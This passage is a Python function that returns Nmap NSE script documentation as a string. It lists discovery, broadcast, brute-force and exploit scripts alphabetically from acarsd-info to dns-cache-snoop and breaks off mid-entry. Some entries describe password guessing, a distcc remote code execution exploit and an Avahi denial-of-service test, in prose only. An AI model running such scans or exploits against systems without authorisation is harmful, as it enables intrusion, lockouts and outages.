def nmap_script_data():
    return """acarsd-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/acarsd-info.html
  Retrieves information from a listening acarsd daemon. Acarsd decodes
  ACARS (Aircraft Communication Addressing and Reporting System) data in
  real time.  The information retrieved by this script includes the
  daemon version, API version, administrator e-mail address and
  listening frequency.

  For more information about acarsd, see:
  * http://www.acarsd.org/

address-info
Categories: default safe
https://nmap.org/nsedoc/scripts/address-info.html
  Shows extra information about IPv6 addresses, such as embedded MAC or IPv4 addresses when available.

  Some IP address formats encode extra information; for example some IPv6
  addresses encode an IPv4 address or MAC address. This script can decode
  these address formats:
  * IPv4-compatible IPv6 addresses,
  * IPv4-mapped IPv6 addresses,
  * Teredo IPv6 addresses,
  * 6to4 IPv6 addresses,
  * IPv6 addresses using an EUI-64 interface ID,
  * IPv4-embedded IPv6 addresses,
  * IPv4-translated IPv6 addresses and
  * ISATAP Modified EUI-64 IPv6 addresses.

  See RFC 4291 for general IPv6 addressing architecture and the
  definitions of some terms.

afp-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/afp-brute.html
  Performs password guessing against Apple Filing Protocol (AFP).

afp-ls
Categories: discovery safe
https://nmap.org/nsedoc/scripts/afp-ls.html
  Attempts to get useful information about files from AFP volumes.
  The output is intended to resemble the output of <code>ls</code>.

afp-path-vuln
Categories: exploit intrusive vuln
https://nmap.org/nsedoc/scripts/afp-path-vuln.html
  Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.

  This script attempts to iterate over all AFP shares on the remote
  host. For each share it attempts to access the parent directory by
  exploiting the directory traversal vulnerability as described in
  CVE-2010-0533.

  The script reports whether the system is vulnerable or not. In
  addition it lists the contents of the parent and child directories to
  a max depth of 2.
  When running in verbose mode, all items in the listed directories are
  shown.  In non verbose mode, output is limited to the first 5 items.
  If the server is not vulnerable, the script will not return any
  information.

  For additional information:
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0533
  * http://www.cqure.net/wp/2010/03/detecting-apple-mac-os-x-afp-vulnerability-cve-2010-0533-with-nmap
  * http://support.apple.com/kb/HT1222

afp-serverinfo
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/afp-serverinfo.html
  Shows AFP server information. This information includes the server's
  hostname, IPv4 and IPv6 addresses, and hardware type (for example
  <code>Macmini</code> or <code>MacBookPro</code>).

afp-showmount
Categories: discovery safe
https://nmap.org/nsedoc/scripts/afp-showmount.html
  Shows AFP shares and ACLs.

ajp-auth
Categories: default auth safe
https://nmap.org/nsedoc/scripts/ajp-auth.html
  Retrieves the authentication scheme and realm of an AJP service (Apache JServ Protocol) that requires authentication.

ajp-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/ajp-brute.html
  Performs brute force passwords auditing against the Apache JServ protocol.
  The Apache JServ Protocol is commonly used by web servers to communicate with
  back-end Java application server containers.

ajp-headers
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ajp-headers.html
  Performs a HEAD or GET request against either the root directory or any
  optional directory of an Apache JServ Protocol server and returns the server response headers.

ajp-methods
Categories: default safe
https://nmap.org/nsedoc/scripts/ajp-methods.html
  Discovers which options are supported by the AJP (Apache JServ
  Protocol) server by sending an OPTIONS request and lists potentially
  risky methods.

  In this script, "potentially risky" methods are anything except GET,
  HEAD, POST, and OPTIONS. If the script reports potentially risky
  methods, they may not all be security risks, but you should check to
  make sure. This page lists the dangers of some common methods:

  http://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29

ajp-request
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ajp-request.html
  Requests a URI over the Apache JServ Protocol and displays the result
  (or stores it in a file). Different AJP methods such as; GET, HEAD,
  TRACE, PUT or DELETE may be used.

  The Apache JServ Protocol is commonly used by web servers to communicate with
  back-end Java application server containers.

allseeingeye-info
Categories: discovery safe version
https://nmap.org/nsedoc/scripts/allseeingeye-info.html
  Detects the All-Seeing Eye service. Provided by some game servers for
  querying the server's status.

  The All-Seeing Eye service can listen on a UDP port separate from the
  main game server port (usually game port + 123). On receiving a packet
  with the payload "s", it replies with various game server status info.

  When run as a version detection script (<code>-sV</code>), the script
  will report on the game name, version, actual port, and whether it has a
  password. When run explicitly (<code>--script allseeingeye-info</code>), the
  script will additionally report on the server name, game type, map name,
  current number of players, maximum number of players, player
  information, and various other information.

  For more info on the protocol see:
  http://int64.org/docs/gamestat-protocols/ase.html
  http://aluigi.altervista.org/papers.htm#ase
  http://sourceforge.net/projects/gameq/
  (relevant files: games.ini, packets.ini, ase.php)

amqp-info
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/amqp-info.html
  Gathers information (a list of all server properties) from an AMQP (advanced message queuing protocol) server.

  See http://www.rabbitmq.com/extensions.html for details on the
  <code>server-properties</code> field.

asn-query
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/asn-query.html
  Maps IP addresses to autonomous system (AS) numbers.

  The script works by sending DNS TXT queries to a DNS server which in
  turn queries a third-party service provided by Team Cymru
  (https://www.team-cymru.org/Services/ip-to-asn.html) using an in-addr.arpa
  style zone set up especially for
  use by Nmap. The responses to these queries contain both Origin and Peer
  ASNs and their descriptions, displayed along with the BGP Prefix and
  Country Code. The script caches results to reduce the number of queries
  and should perform a single query for all scanned targets in a BGP
  Prefix present in Team Cymru's database.

  Be aware that any targets against which this script is run will be sent
  to and potentially recorded by one or more DNS servers and Team Cymru.
  In addition your IP address will be sent along with the ASN to a DNS
  server (your default DNS server, or whichever one you specified with the
  <code>dns</code> script argument).

auth-owners
Categories: default safe
https://nmap.org/nsedoc/scripts/auth-owners.html
  Attempts to find the owner of an open TCP port by querying an auth
  daemon which must also be open on the target system. The auth service,
  also known as identd, normally runs on port 113.

auth-spoof
Categories: malware safe
https://nmap.org/nsedoc/scripts/auth-spoof.html
  Checks for an identd (auth) server which is spoofing its replies.

  Tests whether an identd (auth) server responds with an answer before
  we even send the query.  This sort of identd spoofing can be a sign of
  malware infection, though it can also be used for legitimate privacy
  reasons.

backorifice-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/backorifice-brute.html
  Performs brute force password auditing against the BackOrifice service. The
  <code>backorifice-brute.ports</code> script argument is mandatory (it specifies ports to run
  the script against).

backorifice-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/backorifice-info.html
  Connects to a BackOrifice service and gathers information about
  the host and the BackOrifice service itself.

  The extracted host information includes basic system setup, list
  of running processes, network resources and shares.

  Information about the service includes enabled port redirections,
  listening console applications and a list of BackOrifice plugins
  installed with the service.

bacnet-info
Categories: discovery version
https://nmap.org/nsedoc/scripts/bacnet-info.html
  Discovers and enumerates BACNet Devices collects device information based off
  standard requests. In some cases, devices may not strictly follow the
  specifications, or may comply with older versions of the specifications, and
  will result in a BACNET error response. Presence of this error positively
  identifies the device as a BACNet device, but no enumeration is possible.

  Note: Requests and responses are via UDP 47808, ensure scanner will receive UDP
  47808 source and destination responses.

  http://digitalbond.com


banner
Categories: discovery safe
https://nmap.org/nsedoc/scripts/banner.html
  A simple banner grabber which connects to an open TCP port and prints out anything sent by the listening service within five seconds.

  The banner will be truncated to fit into a single line, but an extra line may be printed for every
  increase in the level of verbosity requested on the command line.

bitcoin-getaddr
Categories: discovery safe
https://nmap.org/nsedoc/scripts/bitcoin-getaddr.html
  Queries a Bitcoin server for a list of known Bitcoin nodes

bitcoin-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/bitcoin-info.html
  Extracts version and node information from a Bitcoin server

bitcoinrpc-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/bitcoinrpc-info.html
  Obtains information from a Bitcoin server by calling <code>getinfo</code> on its JSON-RPC interface.

bittorrent-discovery
Categories: discovery safe
https://nmap.org/nsedoc/scripts/bittorrent-discovery.html
  Discovers bittorrent peers sharing a file based on a user-supplied
  torrent file or magnet link.  Peers implement the Bittorrent protocol
  and share the torrent, whereas the nodes (only shown if the
  include-nodes NSE argument is given) implement the DHT protocol and
  are used to track the peers. The sets of peers and nodes are not the
  same, but they usually intersect.

  If the <code>newtargets</code> script-arg is supplied it adds the discovered
  peers as targets.

bjnp-discover
Categories: safe discovery
https://nmap.org/nsedoc/scripts/bjnp-discover.html
  Retrieves printer or scanner information from a remote device supporting the
  BJNP protocol. The protocol is known to be supported by network based Canon
  devices.

broadcast-ataoe-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-ataoe-discover.html
  Discovers servers supporting the ATA over Ethernet protocol. ATA over Ethernet
  is an ethernet protocol developed by the Brantley Coile Company and allows for
  simple, high-performance access to SATA drives over Ethernet.

  Discovery is performed by sending a Query Config Request to the Ethernet
  broadcast address with all bits set in the major and minor fields of the
  header.

broadcast-avahi-dos
Categories: broadcast dos intrusive vuln
https://nmap.org/nsedoc/scripts/broadcast-avahi-dos.html
  Attempts to discover hosts in the local network using the DNS Service
  Discovery protocol and sends a NULL UDP packet to each host to test
  if it is vulnerable to the Avahi NULL UDP packet denial of service
  (CVE-2011-1002).

  The <code>broadcast-avahi-dos.wait</code> script argument specifies how
  many number of seconds to wait before a new attempt of host discovery.
  Each host who does not respond to this second attempt will be considered
  vulnerable.

  Reference:
  * http://avahi.org/ticket/325
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002

broadcast-bjnp-discover
Categories: safe broadcast
https://nmap.org/nsedoc/scripts/broadcast-bjnp-discover.html
  Attempts to discover Canon devices (Printers/Scanners) supporting the
  BJNP protocol by sending BJNP Discover requests to the network
  broadcast address for both ports associated with the protocol.

  The script then attempts to retrieve the model, version and some additional
  information for all discovered devices.

broadcast-db2-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-db2-discover.html
  Attempts to discover DB2 servers on the network by sending a broadcast request to port 523/udp.

broadcast-dhcp-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-dhcp-discover.html
  Sends a DHCP request to the broadcast address (255.255.255.255) and reports
  the results. By default, the script uses a static MAC address
  (DE:AD:CO:DE:CA:FE) in order to prevent IP pool exhaustion.

  The script reads the response using pcap by opening a listening pcap socket
  on all available ethernet interfaces that are reported up. If no response
  has been received before the timeout has been reached (default 10 seconds)
  the script will abort execution.

  The script needs to be run as a privileged user, typically root.

broadcast-dhcp6-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-dhcp6-discover.html
  Sends a DHCPv6 request (Solicit) to the DHCPv6 multicast address,
  parses the response, then extracts and prints the address along with
  any options returned by the server.

  The script requires Nmap to be run in privileged mode as it binds the socket
  to a privileged port (udp/546).

broadcast-dns-service-discovery
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html
  Attempts to discover hosts' services using the DNS Service Discovery protocol.  It sends a multicast DNS-SD query and collects all the responses.

  The script first sends a query for _services._dns-sd._udp.local to get a
  list of services. It then sends a followup query for each one to try to
  get more information.

broadcast-dropbox-listener
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-dropbox-listener.html
  Listens for the LAN sync information broadcasts that the Dropbox.com client
  broadcasts every 20 seconds, then prints all the discovered client IP
  addresses, port numbers, version numbers, display names, and more.

  If the <code>newtargets</code> script argument is given, all discovered Dropbox
  clients will be added to the Nmap target list rather than just listed in the
  output.

broadcast-eigrp-discovery
Categories: discovery broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-eigrp-discovery.html
  Performs network discovery and routing information gathering through
  Cisco's Enhanced Interior Gateway Routing Protocol (EIGRP).

  The script works by sending an EIGRP Hello packet with the specified Autonomous
  System value to the 224.0.0.10 multicast address and listening for EIGRP Update
  packets. The script then parses the update responses for routing information.

  If no A.S value was provided by the user, the script will listen for multicast
  Hello packets to grab an A.S value. If no interface was provided as a script
  argument or through the -e option, the script will send packets and listen
  through all valid ethernet interfaces simultaneously.


broadcast-hid-discoveryd
Categories: discovery broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-hid-discoveryd.html
  Discovers HID devices on a LAN by sending a discoveryd network broadcast probe.

  For more information about HID discoveryd, see:
  * http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html
  * https://github.com/coldfusion39/VertXploit

broadcast-igmp-discovery
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/broadcast-igmp-discovery.html
  Discovers targets that have IGMP Multicast memberships and grabs interesting information.

  The scripts works by sending IGMP Membership Query message to the 224.0.0.1 All
  Hosts multicast address and listening for IGMP Membership Report messages. The
  script then extracts all the interesting information from the report messages
  such as the version, group, mode, source addresses (depending on the version).

  The script defaults to sending an IGMPv2 Query but this could be changed to
  another version (version 1 or 3) or to sending queries of all three version. If
  no interface was specified as a script argument or with the -e option, the
  script will proceed to sending queries through all the valid ethernet
  interfaces.

broadcast-jenkins-discover
Categories: discovery broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-jenkins-discover.html
  Discovers Jenkins servers on a LAN by sending a discovery broadcast probe.

  For more information about Jenkins auto discovery, see:
  * https://wiki.jenkins.io/display/JENKINS/Auto-discovering+Jenkins+on+the+network

broadcast-listener
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-listener.html
  Sniffs the network for incoming broadcast communication and
  attempts to decode the received packets. It supports protocols like CDP, HSRP,
  Spotify, DropBox, DHCP, ARP and a few more. See packetdecoders.lua for more
  information.

  The script attempts to sniff all ethernet based interfaces with an IPv4 address
  unless a specific interface was given using the -e argument to Nmap.

broadcast-ms-sql-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-ms-sql-discover.html
  Discovers Microsoft SQL servers in the same broadcast domain.

  SQL Server credentials required: No (will not benefit from
  <code>mssql.username</code> & <code>mssql.password</code>).

  The script attempts to discover SQL Server instances in the same broadcast
  domain. Any instances found are stored in the Nmap registry for use by any
  other ms-sql-* scripts that are run in the same scan.

  In contrast to the <code>ms-sql-discover</code> script, the broadcast version
  will use a broadcast method rather than targeting individual hosts. However, the
  broadcast version will only use the SQL Server Browser service discovery method.

broadcast-netbios-master-browser
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-netbios-master-browser.html
  Attempts to discover master browsers and the domains they manage.

broadcast-networker-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-networker-discover.html
  Discovers EMC Networker backup software servers on a LAN by sending a network broadcast query.

broadcast-novell-locate
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-novell-locate.html
  Attempts to use the Service Location Protocol to discover Novell NetWare Core Protocol (NCP) servers.

broadcast-ospf2-discover
Categories: broadcast discovery safe
https://nmap.org/nsedoc/scripts/broadcast-ospf2-discover.html
  Discover IPv4 networks using Open Shortest Path First version 2(OSPFv2) protocol.

  The script works by listening for OSPF Hello packets from the 224.0.0.5
  multicast address. The script then replies and attempts to create a neighbor
  relationship, in order to discover network database.

  If no interface was provided as a script argument or through the -e option,
  the script will fail unless a single interface is present on the system.

broadcast-pc-anywhere
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-pc-anywhere.html
  Sends a special broadcast probe to discover PC-Anywhere hosts running on a LAN.

broadcast-pc-duo
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-pc-duo.html
  Discovers PC-DUO remote control hosts and gateways running on a LAN by sending a special broadcast UDP probe.

broadcast-pim-discovery
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/broadcast-pim-discovery.html
  Discovers routers that are running PIM (Protocol Independent Multicast).

  This works by sending a PIM Hello message to the PIM multicast address
  224.0.0.13 and listening for Hello messages from other routers.

broadcast-ping
Categories: discovery safe broadcast
https://nmap.org/nsedoc/scripts/broadcast-ping.html
  Sends broadcast pings on a selected interface using raw ethernet packets and
  outputs the responding hosts' IP and MAC addresses or (if requested) adds them
  as targets.  Root privileges on UNIX are required to run this script since it
  uses raw sockets.  Most operating systems don't respond to broadcast-ping
  probes, but they can be configured to do so.

  The interface on which is broadcasted can be specified using the -e Nmap option
  or the <code>broadcast-ping.interface</code> script-arg. If no interface is
  specified this script broadcasts on all ethernet interfaces which have an IPv4
  address defined.

  The <code>newtarget</code> script-arg can be used so the script adds the
  discovered IPs as targets.

  The timeout of the ICMP probes can be specified using the <code>timeout</code>
  script-arg. The default timeout is 3000 ms. A higher number might be necessary
  when scanning across larger networks.

  The number of sent probes can be specified using the <code>num-probes</code>
  script-arg. The default number is 1. A higher value might get more results on
  larger networks.

  The ICMP probes sent comply with the --ttl and --data-length Nmap options, so
  you can use those to control the TTL(time to live) and ICMP payload length
  respectively. The default value for TTL is 64, and the length of the payload
  is 0. The payload is consisted of random bytes.

broadcast-pppoe-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-pppoe-discover.html
  Discovers PPPoE (Point-to-Point Protocol over Ethernet) servers using
  the PPPoE Discovery protocol (PPPoED).  PPPoE is an ethernet based
  protocol so the script has to know what ethernet interface to use for
  discovery. If no interface is specified, requests are sent out on all
  available interfaces.

  As the script send raw ethernet frames it requires Nmap to be run in privileged
  mode to operate.

broadcast-rip-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-rip-discover.html
  Discovers hosts and routing information from devices running RIPv2 on the
  LAN. It does so by sending a RIPv2 Request command and collects the responses
  from all devices responding to the request.

broadcast-ripng-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-ripng-discover.html
  Discovers hosts and routing information from devices running RIPng on the
  LAN by sending a broadcast RIPng Request command and collecting any responses.

broadcast-sonicwall-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-sonicwall-discover.html
  Discovers Sonicwall firewalls which are directly attached (not routed) using
  the same method as the manufacturers own 'SetupTool'. An interface needs to be
  configured, as the script broadcasts a UDP packet.

  The script needs to be run as a privileged user, typically root.

  References:
  * https://support.software.dell.com/kb/sw3677)

broadcast-sybase-asa-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-sybase-asa-discover.html
  Discovers Sybase Anywhere servers on the LAN by sending broadcast discovery messages.

broadcast-tellstick-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-tellstick-discover.html
  Discovers Telldus Technologies TellStickNet devices on the LAN. The Telldus
  TellStick is used to wirelessly control electric devices such as lights,
  dimmers and electric outlets. For more information: http://www.telldus.com/

broadcast-upnp-info
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-upnp-info.html
  Attempts to extract system information from the UPnP service by sending a multicast query, then collecting, parsing, and displaying all responses.

broadcast-versant-locate
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-versant-locate.html
  Discovers Versant object databases using the broadcast srvloc protocol.

broadcast-wake-on-lan
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-wake-on-lan.html
  Wakes a remote system up from sleep by sending a Wake-On-Lan packet.

broadcast-wpad-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-wpad-discover.html
  Retrieves a list of proxy servers on a LAN using the Web Proxy
  Autodiscovery Protocol (WPAD).  It implements both the DHCP and DNS
  methods of doing so and starts by querying DHCP to get the address.
  DHCP discovery requires nmap to be running in privileged mode and will
  be skipped when this is not the case.  DNS discovery relies on the
  script being able to resolve the local domain either through a script
  argument or by attempting to reverse resolve the local IP.

broadcast-wsdd-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-wsdd-discover.html
  Uses a multicast query to discover devices supporting the Web Services
  Dynamic Discovery (WS-Discovery) protocol. It also attempts to locate
  any published Windows Communication Framework (WCF) web services (.NET
  4.0 or later).

broadcast-xdmcp-discover
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-xdmcp-discover.html
  Discovers servers running the X Display Manager Control Protocol (XDMCP) by
  sending a XDMCP broadcast request to the LAN. Display managers allowing access
  are marked using the keyword Willing in the result.

cassandra-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/cassandra-brute.html
  Performs brute force password auditing against the Cassandra database.

  For more information about Cassandra, see:
  http://cassandra.apache.org/

cassandra-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/cassandra-info.html
  Attempts to get basic info and server status from a Cassandra database.

  For more information about Cassandra, see:
  http://cassandra.apache.org/

cccam-version
Categories: version
https://nmap.org/nsedoc/scripts/cccam-version.html
  Detects the CCcam service (software for sharing subscription TV among
  multiple receivers).

  The service normally runs on port 12000. It distinguishes
  itself by printing 16 random-looking bytes upon receiving a
  connection.

  Because the script attempts to detect "random-looking" bytes, it has a small
  chance of failing to detect the service when the data do not seem random
  enough.
cics-enum
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/cics-enum.html
  CICS transaction ID enumerator for IBM mainframes.
  This script is based on mainframe_brute by Dominic White
  (https://github.com/sensepost/mainframe_brute). However, this script
  doesn't rely on any third party libraries or tools and instead uses
  the NSE TN3270 library which emulates a TN3270 screen in lua.

  CICS only allows for 4 byte transaction IDs, that is the only specific rule
  found for CICS transaction IDs.

cics-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/cics-info.html
  Using the CICS transaction CEMT, this script attempts to gather information
  about the current CICS transaction server region. It gathers OS information,
  Datasets (files), transactions and user ids. Based on CICSpwn script by
  Ayoub ELAASSAL.

cics-user-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/cics-user-brute.html
  CICS User ID brute forcing script for the CESL login screen.

cics-user-enum
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/cics-user-enum.html
  CICS User ID enumeration script for the CESL/CESN Login screen.

citrix-brute-xml
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/citrix-brute-xml.html
  Attempts to guess valid credentials for the Citrix PN Web Agent XML
  Service. The XML service authenticates against the local Windows server
  or the Active Directory.

  This script makes no attempt of preventing account lockout. If the
  password list contains more passwords than the lockout-threshold
  accounts will be locked.

citrix-enum-apps-xml
Categories: discovery safe
https://nmap.org/nsedoc/scripts/citrix-enum-apps-xml.html
  Extracts a list of applications, ACLs, and settings from the Citrix XML
  service.

  The script returns more output with higher verbosity.

citrix-enum-apps
Categories: discovery safe
https://nmap.org/nsedoc/scripts/citrix-enum-apps.html
  Extracts a list of published applications from the ICA Browser service.

citrix-enum-servers-xml
Categories: discovery safe
https://nmap.org/nsedoc/scripts/citrix-enum-servers-xml.html
  Extracts the name of the server farm and member servers from Citrix XML
  service.

citrix-enum-servers
Categories: discovery safe
https://nmap.org/nsedoc/scripts/citrix-enum-servers.html
  Extracts a list of Citrix servers from the ICA Browser service.

clamav-exec
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/clamav-exec.html
  Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.

  ClamAV server 0.99.2, and possibly other previous versions, allow the execution
  of dangerous service commands without authentication. Specifically, the command 'SCAN'
  may be used to list system files and the command 'SHUTDOWN' shut downs the
  service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).

  This script without arguments test the availability of the command 'SCAN'.

  Reference:
  * https://twitter.com/nitr0usmx/status/740673507684679680
  * https://bugzilla.clamav.net/show_bug.cgi?id=11585

clock-skew
Categories: default safe
https://nmap.org/nsedoc/scripts/clock-skew.html
  Analyzes the clock skew between the scanner and various services that report timestamps.

  At the end of the scan, it will show groups of systems that have similar median
  clock skew among their services. This can be used to identify targets with
  similar configurations, such as those that share a common time server.

  You must run at least 1 of the following scripts to collect clock data:
  * bitcoin-info
  * http-date
  * http-ntlm-info
  * imap-ntlm-info
  * memcached-info
  * ms-sql-ntlm-info
  * nntp-ntlm-info
  * ntp-info
  * openwebnet-discovery
  * pop3-ntlm-info
  * rfc868-time
  * smb-os-discovery
  * smb-security-mode
  * smb2-time
  * smb2-vuln-uptime
  * smtp-ntlm-info
  * ssl-date
  * telnet-ntlm-info

coap-resources
Categories: safe discovery
https://nmap.org/nsedoc/scripts/coap-resources.html
  Dumps list of available resources from CoAP endpoints.

  This script establishes a connection to a CoAP endpoint and performs a
  GET request on a resource. The default resource for our request is
  <code>/.well-known/core</core>, which should contain a list of
  resources provided by the endpoint.

  For additional information:
  * https://en.wikipedia.org/wiki/Constrained_Application_Protocol
  * https://tools.ietf.org/html/rfc7252
  * https://tools.ietf.org/html/rfc6690

couchdb-databases
Categories: discovery safe
https://nmap.org/nsedoc/scripts/couchdb-databases.html
  Gets database tables from a CouchDB database.

  For more info about the CouchDB HTTP API, see
  http://wiki.apache.org/couchdb/HTTP_database_API.

couchdb-stats
Categories: discovery safe
https://nmap.org/nsedoc/scripts/couchdb-stats.html
  Gets database statistics from a CouchDB database.

  For more info about the CouchDB HTTP API and the statistics, see
  http://wiki.apache.org/couchdb/Runtime_Statistics
  and
  http://wiki.apache.org/couchdb/HTTP_database_API.

creds-summary
Categories: auth default safe
https://nmap.org/nsedoc/scripts/creds-summary.html
  Lists all discovered credentials (e.g. from brute force and default password checking scripts) at end of scan.

cups-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/cups-info.html
  Lists printers managed by the CUPS printing service.

cups-queue-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/cups-queue-info.html
  Lists currently queued print jobs of the remote CUPS service grouped by
  printer.

cvs-brute-repository
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/cvs-brute-repository.html
  Attempts to guess the name of the CVS repositories hosted on the remote server.
  With knowledge of the correct repository name, usernames and passwords can be guessed.

cvs-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/cvs-brute.html
  Performs brute force password auditing against CVS pserver authentication.

daap-get-library
Categories: discovery safe
https://nmap.org/nsedoc/scripts/daap-get-library.html
  Retrieves a list of music from a DAAP server. The list includes artist
  names and album and song titles.

  Output will be capped to 100 items if not otherwise specified in the
  <code>daap_item_limit</code> script argument. A
  <code>daap_item_limit</code> below zero outputs the complete contents of
  the DAAP library.

  Based on documentation found here:
  http://www.tapjam.net/daap/.

daytime
Categories: discovery safe
https://nmap.org/nsedoc/scripts/daytime.html
  Retrieves the day and time from the Daytime service.

db2-das-info
Categories: safe discovery version
https://nmap.org/nsedoc/scripts/db2-das-info.html
  Connects to the IBM DB2 Administration Server (DAS) on TCP or UDP port 523 and
  exports the server profile.  No authentication is required for this request.

  The script will also set the port product and version if a version scan is
  requested.

deluge-rpc-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/deluge-rpc-brute.html
  Performs brute force password auditing against the DelugeRPC daemon.

dhcp-discover
Categories: discovery safe
https://nmap.org/nsedoc/scripts/dhcp-discover.html
  Sends a DHCPINFORM request to a host on UDP port 67 to obtain all the local configuration parameters
  without allocating a new address.

  DHCPINFORM is a DHCP request that returns useful information from a DHCP server, without allocating an IP
  address. The request sends a list of which fields it wants to know (a handful by default, every field if
  verbosity is turned on), and the server responds with the fields that were requested. It should be noted
  that the server doesn't have to return every field, nor does it have to return them in the same order,
  or honour the request at all. A Linksys WRT54g, for example, completely ignores the list of requested
  fields and returns a few standard ones. This script displays every field it receives.

  With script arguments, the type of DHCP request can be changed, which can lead to interesting results.
  Additionally, the MAC address can be randomized, which in should override the cache on the DHCP server and
  assign a new IP address. Extra requests can also be sent to exhaust the IP address range more quickly.

  Some of the more useful fields:
  * DHCP Server (the address of the server that responded)
  * Subnet Mask
  * Router
  * DNS Servers
  * Hostname

dicom-brute
Categories: auth brute
https://nmap.org/nsedoc/scripts/dicom-brute.html
  Attempts to brute force the Application Entity Title of a DICOM server (DICOM Service Provider).

  Application Entity Titles (AET) are used to restrict responses only to clients knowing the title. Hence,
   the called AET is used as a form of password.

dicom-ping
Categories: discovery default safe auth
https://nmap.org/nsedoc/scripts/dicom-ping.html
  Attempts to discover DICOM servers (DICOM Service Provider) through a partial C-ECHO request.
   It also detects if the server allows any called Application Entity Title or not.

  The script responds with the message "Called AET check enabled" when the association request
   is rejected due configuration. This value can be bruteforced.

  C-ECHO requests are commonly known as DICOM ping as they are used to test connectivity.
  Normally, a 'DICOM ping' is formed as follows:
  * Client -> A-ASSOCIATE request -> Server
  * Server -> A-ASSOCIATE ACCEPT/REJECT -> Client
  * Client -> C-ECHO request -> Server
  * Server -> C-ECHO response -> Client
  * Client -> A-RELEASE request -> Server
  * Server -> A-RELEASE response -> Client

  For this script we only send the A-ASSOCIATE request and look for the success code
   in the response as it seems to be a reliable way of detecting DICOM servers.

dict-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/dict-info.html
  Connects to a dictionary server using the DICT protocol, runs the SHOW
  SERVER command, and displays the result. The DICT protocol is defined in RFC
  2229 and is a protocol which allows a client to query a dictionary server for
  definitions from a set of natural language dictionary databases.

  The SHOW server command must be implemented and depending on access will show
  server information and accessible databases. If authentication is required, the
  list of databases will not be shown.

distcc-cve2004-2687
Categories: exploit intrusive vuln
https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html
  Detects and exploits a remote code execution vulnerability in the distributed
  compiler daemon distcc. The vulnerability was disclosed in 2002, but is still
  present in modern implementation due to poor configuration of the service.

dns-blacklist
Categories: external safe
https://nmap.org/nsedoc/scripts/dns-blacklist.html
  Checks target IP addresses against multiple DNS anti-spam and open
  proxy blacklists and returns a list of services for which an IP has been flagged.  Checks may be limited by service category (eg: SPAM,
  PROXY) or to a specific service name.
dns-brute
Categories: intrusive discovery
https://nmap.org/nsedoc/scripts/dns-brute.html
  Attempts to enumerate DNS hostnames by brute force guessing of common
  subdomains. With the <code>dns-brute.srv</code> argument, dns-brute will also
  try to enumerate common DNS SRV records.

  Wildcard records are listed as "*A" and "*AAAA" for IPv4 and IPv6 respectively.

dns-cache-snoop
Categories: intrusive discovery
https://nmap.org/nsedoc/scripts/dns-cache-snoop.html
  Performs DNS cache snooping against a DNS server.

  There are two modes of operation, controlled by the
  <code>dns-cache-snoop.mode</code> script argument. In
  <code>nonrecursive</code> mode (the default), queries are sent to the
